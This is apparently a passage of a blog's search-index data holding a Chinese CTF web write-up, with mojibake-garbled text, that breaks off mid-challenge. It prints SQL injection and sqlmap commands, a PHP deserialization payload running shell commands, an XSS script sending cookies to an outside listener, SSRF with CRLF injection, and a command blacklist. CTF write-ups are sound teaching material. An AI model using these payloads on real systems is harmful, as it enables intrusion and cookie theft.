çš„å‘¢ï¼Ÿå‘ç° cookie å†…æœ‰ token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.STZdzBL4eUV1eQS8V9eJ96m0Q5LTwqBhFw5stXTk89M ï¼ˆç›´æ¥å¼€å§‹ Google å‘ç°æˆ‘ä»¬éœ€è¦ jwt ä¼ªé€  admin èº«ä»½ï¼Œè€Œä¼ªé€ éœ€è¦å¯†é’¥æ‰èƒ½éªŒè¯ã€‚ åœ¨ /read ç•Œé¢ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡/read?file=/proc/self/environè¯»å–ç¯å¢ƒå˜é‡ï¼Œå‘ç° KEY = THIS_is_a_KEYã€‚ é‚£ä¹ˆåœ¨ JSON Web Tokens ä¿®æ”¹ jwt ä¿¡æ¯ï¼Œå†è®¿é—® /admin å³å¯ ","date":"2022-08-28","objectID":"/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/:9:0","tags":["CTF","WEB","Writeup"],"title":"CNSS2022å¤ä»¤è¥_WEB_Writeup","uri":"/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/"},{"categories":["CTF"],"content":"ğŸƒ ç¬¬ä¸€æ¬¡è·‘è·¯ æ‰“å¼€æ˜¯æ³¨å†Œç•Œé¢ å…ˆéšä¾¿è¾“ç‚¹å•¥ï¼Œç‚¹å‡»å³ä¾§çš„æ³¨å†Œï¼Œè·³è½¬å›æ˜¾ åˆ«æƒ³äº†ï¼Œæ­¤è·¯ä¸é€š é‚£ä¹ˆæˆ‘ä»¬å†çœ‹çœ‹ç™»å½•ç•Œé¢ï¼Œå°è¯• sql æ³¨å…¥ï¼Œè¾“å…¥ username = adminâ€™\u0026password = 123 å‘ç°å›æ˜¾ æˆ‘è¶…ï¼Œæˆ‘ğŸ‘–å‘¢ï¼Ÿ è¯´æ˜å¯èƒ½å­˜åœ¨ sqliï¼Œä½¿ç”¨ä¸‡èƒ½è´¦å·ç™»å½• username = admin'or+1=1#\u0026password = 123 è·³è½¬åˆ°äº†æ–°çš„é¡µé¢ï¼Œå°è¯•è¿‡åå‘ç° Cookie: username = cnss å¯èƒ½å­˜åœ¨ Cookie çš„ sqliã€‚ å°è¯• username = cnssâ€™# ä½†æ˜¯å‘ç°å›æ˜¾æ˜¯éšæœºçš„æˆåŠŸè®¿é—®æˆ–è€…å¤±è´¥ï¼ŒçŒœæµ‹åç«¯æœ‰éšæœºè¿‡æ»¤ï¼ˆè¿™é‡Œæ˜¯ä¸ºäº†å¡ sqlmapï¼‰ï¼Œä½†ä¾ç„¶å¯ä»¥ sqli æ¥ä¸‹æ¥å°±æ˜¯å¥—è·¯åŒ–çš„ sqli äº†ï¼Œå…ˆçˆ†åº“å username=-1'union select group_concat(schema_name) from information_schema.schemata# å†çˆ†è¡¨å username=-1'union select group_concat(table_name) from information_schema.tables where table_schema=database()# å†çˆ†åˆ—å username=-1'union select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='user'# username=-1'union select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='fulage'# æœ€åè¯»å– flag username = -1'union select bio from CN55.fulage where id =4# è¿™é¢˜é‡Œé¢å…¶å®è¿˜æœ‰ fake flagï¼Œä½†æ˜¯æˆ‘è¿™é‡Œç•¥å»äº†ã€‚å¸Œæœ›èƒ½å¤Ÿè‡ªå·±æ‘¸ç´¢ä¸€ä¸‹ã€‚ æˆ–è€…å¯ä»¥ä½¿ç”¨ sqlmap ä¸€æŠŠæ¢­äº† python sqlmap.py -u http://8.130.29.197:6011/welcome.php --cookie \"username=cnss\" --level 2 --dbs --hex python sqlmap.py -u http://8.130.29.197:6011/welcome.php --cookie \"username=cnss\" --level 2 -D CN55 --tables --hex python sqlmap.py -u http://8.130.29.197:6011/welcome.php --cookie \"username=cnss\" --level 2 -D CN55 -T fulage --dump --hex ","date":"2022-08-28","objectID":"/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/:10:0","tags":["CTF","WEB","Writeup"],"title":"CNSS2022å¤ä»¤è¥_WEB_Writeup","uri":"/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/"},{"categories":["CTF"],"content":"ğŸ¤ To_be_Admin_Again è¿˜æ˜¯ç›´æ¥å®¡æŸ¥æºç  // index.php \u003c?php error_reporting(0); ini_set('session.serialize_handler','php'); session_start(); highlight_file(__FILE__); class CNSS{ private $username = 'guest'; private $code = 'phpinfo();'; public function __construct(){ $this-\u003eusername = $username; $this-\u003ecode = $cmd; } function __wakeup(){ $this-\u003eusername = 'guest'; } function __destruct(){ if($this-\u003eusername === 'admin'){ eval($this-\u003ecode); } } } // save.php \u003c?php error_reporting(0); ini_set('session.serialize_handler','php_serialize'); session_start(); highlight_file(__FILE__); if (isset($_GET['cnss'])) { $_SESSION['cnss'] = $_GET['cnss']; } å‘ç°å¯ç–‘ä»£ç ini_set('session.serialize_handler','php_serialize');ï¼ˆå¼€æœ å‘ç°è¿™é‡Œå¯èƒ½å­˜åœ¨Sessionåºåˆ—åŒ–é€‰æ‹©å™¨æ¼æ´ï¼Œå¯ä»¥å®ç°ååºåˆ—åŒ–ä½¿ $code å¯æ§ è¿™é‡Œå€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œåœ¨ class CNSS ä¸­ï¼Œ$username,$code çš„ç±»å‹éƒ½æ˜¯ privateã€‚ååºåˆ—åŒ–æ—¶éœ€è¦åœ¨å±æ€§åç§°å‰é¢åŠ ä¸Š%00ç±»å%00ã€‚è¿™é‡Œä¸ºäº†é¿å…ç›´æ¥åºåˆ—åŒ–%00æ˜¾ç¤ºä¹±ç çš„é—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥è¾“å‡ºurlencodeåçš„payload \u003c?php class CNSS { private $username = 'admin'; private $code = 'system(\"ls /\");'; } $a = new CNSS; echo '|' . urlencode(serialize($a)); ?\u003e ç„¶åä¿®æ”¹å±æ€§æ•°ä»¥ç»•è¿‡ weakupï¼ˆååºåˆ—åŒ–æ¼æ´çš„åŸºæœ¬çŸ¥è¯† å¾—åˆ°ï¼š |O%3A4%3A%22CNSS%22%3A3%3A%7Bs%3A14%3A%22%00CNSS%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A10%3A%22%00CNSS%00code%22%3Bs%3A15%3A%22system%28%22ls+%2F%22%29%3B%22%3B%7D å‘ç° flag åœ¨æ ¹ç›®å½•ä¸‹ï¼Œä¿®æ”¹æ‰§è¡Œä»£ç ä¸º cat /flag æ‰€ä»¥æœ€ç»ˆæ­¥éª¤ä¸ºå…ˆè®¿é—® http://8.130.29.197:6008/save.php?cnss=|O%3A4%3A%22CNSS%22%3A3%3A%7Bs%3A14%3A%22%00CNSS%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A10%3A%22%00CNSS%00code%22%3Bs%3A20%3A%22system%28%22cat+%2Fflag%22%29%3B%22%3B%7D å†è®¿é—® http://8.130.29.197:6008 å¾—åˆ° flag ","date":"2022-08-28","objectID":"/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/:11:0","tags":["CTF","WEB","Writeup"],"title":"CNSS2022å¤ä»¤è¥_WEB_Writeup","uri":"/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/"},{"categories":["CTF"],"content":"ğŸ˜° To_be_Admin_Again_and_Again æŸ¥çœ‹ html æºç å‘ç° Message æ–‡æœ¬æ¡†å¯ä»¥é€šè¿‡é—­åˆ textarea é€ æˆ XSS \u003ctextarea id=\"message\" name=\"message\" class=\"form-control input\" rows=\"8\"\u003e\u003c/textarea\u003e åœ¨ Message æ–‡æœ¬æ¡†å†™å…¥å¦‚ä¸‹å†…å®¹ç‚¹å‡» Preview æŒ‰é’®ï¼Œå‘ç° JS ä»£ç è¢«æ‰§è¡Œäº† \u003c/textarea\u003e\u003cscript\u003ealert(1)\u003c/script\u003e æ„é€ å¦‚ä¸‹ JS å°† Cookie å‘é€åˆ°æœåŠ¡å™¨è®°å½• var img = new Image(); var cookie = encodeURIComponent(document.cookie); img.src = 'http://10.0.0.1:7777/?cookie=' + cookie; document.body.appendChild(img); å†™ä¸ªè„šæœ¬çˆ†ç ´ SHA256 import hashlib import string table = string.ascii_letters + string.digits def crack(h): for a in table: for b in table: for c in table: for d in table: t = a + b + c + d if hashlib.sha256(t.encode()).hexdigest()[:6] == h: return t return None print(crack('b62936')) æäº¤åå¯ä»¥æ‹¿åˆ° bot è®¿é—®çš„æ—¶å€™ä½¿ç”¨çš„ Cookie [root@iZ2zeglb8irh5gnt1c6x7dZ ~]# nc -lvvp 7777 Ncat: Version 7.50 ( https://nmap.org/ncat ) Ncat: Listening on :::7777 Ncat: Listening on 0.0.0.0:7777 Ncat: Connection from 1.117.6.207. Ncat: Connection from 1.117.6.207:39600. GET /?cookie=session%3DeyJhZG1pbiI6dHJ1ZX0.YwzeZQ.AXZf3l60naksoRZHWyy0frUZFEI HTTP/1.1 Host: 101.200.202.216:7777 Connection: keep-alive User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/90.0.4430.212 Safari/537.36 Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8 Referer: http://127.0.0.1:5000/ Accept-Encoding: gzip, deflate Accept-Language: en-US æ›¿æ¢ Cookie è®¿é—® /admin æ‹¿åˆ° flag ","date":"2022-08-28","objectID":"/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/:12:0","tags":["CTF","WEB","Writeup"],"title":"CNSS2022å¤ä»¤è¥_WEB_Writeup","uri":"/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/"},{"categories":["CTF"],"content":"ğŸ¤¯To_be_Admin_Again_and_Again_and_Again å°è¯•ä½¿ç”¨ file åè®® è¯»å–æ–‡ä»¶ï¼Œå¯ä»¥è¯»å–ï¼Œä½†æ˜¯è¯»å–ä¸åˆ° /flagï¼Œè€ƒè™‘ flag ä¸åœ¨è¿™ä¸ªæ–‡ä»¶ http://1.117.6.207:65006/request?url=file:///etc/passwd çœ‹ä¸‹æœåŠ¡ç«¯çš„è¿›ç¨‹æ˜¯é€šè¿‡ä»€ä¹ˆå‘½ä»¤å¯åŠ¨çš„ http://1.117.6.207:65006/request?url=file:///proc/self/cmdline python app.py å°è¯•è¯»æºç ï¼Œ å¹¶æ²¡æœ‰å‘ç° flagï¼Œ è€ƒè™‘ flag åœ¨å†…ç½‘çš„å…¶ä»–ä¸»æœºä¸Š http://1.117.6.207:65006/request?url=file:///proc/self/cwd/app.py import urllib.parse import urllib.request from flask import Flask, request, render_template app = Flask(__name__) SCHEME = ['http', 'https', 'file'] @app.route('/') def index(): return render_template('index.html') @app.route('/request') def req(): url = request.args.get('url') if url: if urllib.parse.urlparse(url).scheme not in SCHEME: return 'Invalid scheme' with urllib.request.urlopen(url) as f: return f.read() else: return 'Please enter a URL' if __name__ == '__main__': app.run('0.0.0.0') è¯»å– arp è®°å½•ï¼Œå‘ç° 172.16.233.233 æœ‰ MAC åœ°å€ ï¼ˆå¦ä¸€ä¸ªæ˜¯ç½‘å…³ï¼‰ï¼Œè€ƒè™‘åˆ° Flask é»˜è®¤ç«¯å£ä¸º 5000ï¼Œå°è¯•è®¿é—® http://172.16.233.233:5000 http://1.117.6.207:65006/request?url=file:///proc/net/arp IP address HW type Flags HW address Mask Device 172.16.233.245 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.236 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.219 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.225 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.5 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.230 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.221 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.251 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.248 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.253 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.242 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.233 0x1 0x2 02:42:ac:10:e9:e9 * eth0 172.16.233.247 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.238 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.227 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.224 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.223 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.229 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.220 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.250 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.252 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.235 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.241 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.232 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.246 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.237 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.1 0x1 0x2 02:42:3c:46:4a:85 * eth0 172.16.233.226 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.231 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.222 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.228 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.249 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.254 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.243 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.234 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.23 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.240 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.239 0x1 0x0 00:00:00:00:00:00 * eth0 é¡ºåˆ©æ‹¿åˆ°å†…ç½‘ä¸»æœºçš„æºç ï¼Œ åˆ†æåå‘ç°ï¼Œè¯·æ±‚çš„æ—¶å€™éœ€è¦å¸¦ä¸Š Cookie å¹¶ä¸”è¦æœ‰ admin=6a9e47ca067b07047e3d571512ec4f82ï¼Œè€ƒè™‘ urlibçš„ CLRF æ¼æ´ CVE-2019-9740 å’Œ CVE-2019-9947 http://1.117.6.207:65006/request?url=http://172.16.233.233:5000 Try /source ? http://1.117.6.207:65006/request?url=http://172.16.233.233:5000/source from flask import Flask, request app = Flask(__name__) @app.route('/') def index(): return 'Try /source ?' @app.route('/source') def source(): with open('app.py') as f: return f.read() @app.route('/admin') def admin(): c = request.cookies.get('admin') if c and c == '6a9e47ca067b07047e3d571512ec4f82': with open('/flag') as f: return f.read() else: return 'Only admin can read the flag' if __name__ == '__main__': app.run('0.0.0.0') æˆåŠŸæ‹¿åˆ° flag http://1.117.6.207:65006/request?url=http://172.16.233.233:5000/admin%20HTTP/1.1%0d%0aCookie:%20admin=6a9e47ca067b07047e3d571512ec4f82%0d%0aheader:%20 CNSS{ssrf\u0026urllib_ar3_dddddd4nger0us} ","date":"2022-08-28","objectID":"/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/:13:0","tags":["CTF","WEB","Writeup"],"title":"CNSS2022å¤ä»¤è¥_WEB_Writeup","uri":"/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/"},{"categories":["CTF"],"content":"ğŸ’‰ Inject me ä¸‹è½½é™„ä»¶ï¼Œå…ˆåœ¨æœ¬åœ°è·‘èµ·æ¥ java -jar summer-0.0.1.jar ç„¶åç”¨ jadx åç¼–è¯‘ï¼Œæ³¨æ„åˆ°é…ç½®æ–‡ä»¶ Resources/BOOT-INF/classes/application.yml server: address: 0.0.0.0 port: 5000 spring: application: name: cnss-summer config: method: SUMMMMMER auth: len: 4 expire: 5000 command: allow: 127.0.0.1 blacklist: rm, cat, tac, mv, touch, mkdir, rmdir, whoami, ls ç¡®è®¤å¯ä»¥è®¿é—® http://127.0.0.1:5000 æ¥ä¸‹æ¥åˆ†æä¸€ä¸‹ Controller ï¼Œå®šä½åˆ° com.cnss.summer.controller åŒ…ä¸‹ï¼Œä¸»è¦çœ‹ä¸€ä¸‹æ³¨è§£ @RequestMapping @GetMapping @PostMapping ï¼Œå‘ç°ä¸‹é¢ä¸‰ä¸ªæ³¨å†Œçš„è·¯ç”± // /cnss/summer/login public ResponseEntity login(@NotNull @Valid @RequestBody LoginParam credentials, HttpServletRequest request) { String uuid = UUID.randomUUID().toString(); log.info(\"uuid: {}\", uuid); String uuid2 = DigestUtils.md5DigestAsHex(uuid.getBytes(StandardCharsets.UTF_8)); request.getSession().setAttribute(\"username\", credentials.getUsername()); request.getSession().setAttribute(\"token\", uuid2); request.getSession().setAttribute(\"timestamp\", Long.valueOf(System.currentTimeMillis())); HashMap\u003cString, String\u003e map = new HashMap\u003c\u003e(); map.put(\"token\", uuid2); return new ResponseEntity(\"200\", \"Login success!\", map); } // /cnss/summer/parse public ResponseEntity parse(@NotNull @RequestBody ParseParam payload, @RequestParam(\"nammmmme\") @NotEmpty @Valid String username, HttpServletRequest request) throws Exception { String username1 = (String) request.getSession().getAttribute(\"username\"); if (!Objects.equals(username, username1) || !Objects.equals(payload.getUsername(), username1)) { throw new Exception(); } Reader stringReader = new StringReader(payload.getXml()); SAXReader reader = new SAXReader(); Document document = reader.read(stringReader); Element root = document.getRootElement(); return new ResponseEntity(\"200\", \"Parse success!\", root.getText()); } // /cnss/doCmd public void doCmd(@RequestParam String cmd, HttpServletRequest request) throws IOException { if (cmd == null) { return; } for (String str : this.config.getBlacklist()) { if (cmd.contains(str)) { return; } } Process process = new ProcessBuilder(\"/bin/sh\", \"-c\", cmd).start(); try { process.waitFor(); } catch (InterruptedException e) { e.printStackTrace(); } } å†åˆ†æä¸€ä¸‹ Filter å®šä½åˆ° com.cnss.summer.filter // /cnss/summer/parse public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException { String token; HttpServletRequest request = (HttpServletRequest) servletRequest; if (!Objects.equals(request.getMethod(), this.config.getMethod()) || (token = (String) request.getSession().getAttribute(\"token\")) == null) { return; } long timestamp = ((Long) request.getSession().getAttribute(\"timestamp\")).longValue(); long now = System.currentTimeMillis(); if (now - timestamp \u003e this.config.getExpire()) { return; } String token2 = token.substring(0, this.config.getAuthLen()); String uuid = request.getHeader(\"UUID\"); if (!Objects.equals(token2, DigestUtils.md5DigestAsHex(uuid.getBytes(StandardCharsets.UTF_8)).substring(0, this.config.getAuthLen()))) { request.getSession().invalidate(); return; } request.getSession().setAttribute(\"timestamp\", Long.valueOf(now)); filterChain.doFilter(servletRequest, servletResponse); } // /cnss/doCmd public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException { HttpServletRequest request = (HttpServletRequest) servletRequest; String client = request.getRemoteAddr(); if (!client.equals(this.config.getAllow())) { return; } filterChain.doFilter(servletRequest, servletResponse); } å¯ä»¥çœ‹åˆ°ï¼Œèƒ½å¤Ÿç›´æ¥è¯·æ±‚çš„æ¥å£åªæœ‰ /cnss/summer/login ï¼Œ åœ¨è¯·æ±‚çš„æ—¶å€™éœ€è¦ POSTçš„å†…å®¹ä¸º LoginParam public class LoginParam { @JsonProperty(\"us3rname\") @NotEmpty private String username; @JsonProperty(\"p@ssword\") @NotEmpty private String password; } æ‰€ä»¥POSTçš„å†…å®¹ä¸º { \"us3rname\": \"test\", \"p@ssword\": \"test\" } è¿”å›ç»“æœå¦‚ä¸‹ { \"code\": \"200\", \"message\": \"Login success!\", \"data\": { \"token\": \"72600e5c9b1b1340a1b52cf736636c88\" } } æ¥ä¸‹æ¥åˆ†æä¸€ä¸‹ /cnss/summer/parse çš„ Filter ç»“åˆé…ç½®æ–‡ä»¶åˆ†æï¼Œ éœ€è¦å°†HTTPè¯·æ±‚æ–¹æ³•è®¾ç½®ä¸º SUMMM","date":"2022-08-28","objectID":"/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/:14:0","tags":["CTF","WEB","Writeup"],"title":"CNSS2022å¤ä»¤è¥_WEB_Writeup","uri":"/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/"},{"categories":["ME"],"content":"æ‘˜è¦ï¼šä½ å¥½ï¼Œè¿™é‡Œæ˜¯ 4ever-xxxl","date":"2022-08-07","objectID":"/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/","tags":["Essay"],"title":"ç¬¬ä¸€ç¯‡æ–‡ç« ","uri":"/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/"},{"categories":["ME"],"content":"ä½ å¥½ï¼Œè¿™é‡Œæ˜¯ 4ever-xxxlã€‚ ","date":"2022-08-07","objectID":"/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/:0:0","tags":["Essay"],"title":"ç¬¬ä¸€ç¯‡æ–‡ç« ","uri":"/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/"}]